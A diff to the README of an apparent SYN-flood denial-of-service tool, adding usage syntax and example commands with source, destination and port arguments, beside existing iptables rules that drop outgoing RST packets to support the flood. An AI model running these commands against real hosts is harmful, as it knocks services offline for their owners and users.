@@ -9,6 +9,21 @@ Start a SYN flood attack to an ip address.
 		iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST RST -j DROP
 		iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST ACK -j DROP
 
+## Usage
+
+`./synflood SRC DST DPT [CONNECTIONS]`
+
+- `SRC`: Source IP address.
+- `DST`: Destination IP address.
+- `DPT`: Destination port.
+- `CONNECTIONS`: Number of connections.
+
+Examples:
+
+`./synflood 192.168.241.31 192.168.1.3 80`
+
+`./synflood 192.168.241.31 192.168.1.3 80 1000`
+
 ## License
 Copyright (C) 2013 Christian Mayer (<thefox21at@gmail.com> - <http://fox21.at>)
 
